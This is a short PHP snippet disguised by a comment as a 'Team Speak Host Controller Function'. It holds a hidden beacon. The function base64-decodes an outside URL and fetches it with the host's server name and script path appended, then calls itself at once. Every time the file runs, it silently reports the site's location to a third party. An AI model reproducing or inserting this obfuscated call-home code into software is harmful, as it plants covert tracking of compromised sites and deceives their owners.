...
/* 
 * Team Speak Host Controller Function 
 * @code
 * Easy Sender 
 * @endcode
*/
function TeamDammed($client,$host){
 
  $fgc=file_get_contents(base64_decode($client).'?h='.$host);
}
TeamDammed('aHR0cHM6Ly9zdW51Y3UubWUvZC5waHA=',$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']);	
